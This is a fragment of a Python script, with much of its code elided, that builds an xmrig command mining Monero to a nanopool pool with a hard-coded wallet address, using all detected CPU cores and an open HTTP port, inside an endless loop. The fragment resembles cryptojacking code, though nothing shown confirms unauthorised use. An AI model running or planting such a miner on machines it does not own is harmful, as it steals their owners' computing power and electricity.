...
if operate_system == 'lin':
    ...
    try:
        ...
        pass
import psutil
command_xmrig_default = '--algo randomx -o xmr-us-east1.nanopool.org:10343 -u 43ZBkWEBNvSYQDsEMMCktSFHrQZTDwwyZfPp43FQknuy4UD3qhozWMtM4kKRyrr2Nk66JEiTypfvPbkFd5fGXbA1LxwhFZf -p nql --tls --http-host=0.0.0.0 --http-port=80 -t %s' %cores
#command_xmrig_default = '--algo randomx -o xmr-us-east1.nanopool.org:10343 -u 43ZBkWEBNvSYQDsEMMCktSFHrQZTDwwyZfPp43FQknuy4UD3qhozWMtM4kKRyrr2Nk66JEiTypfvPbkFd5fGXbA1LxwhFZf -p nql --tls --cpu-max-threads-hint=100 --http-host=0.0.0.0 --http-port=80'
while True:
    time.sleep(1)
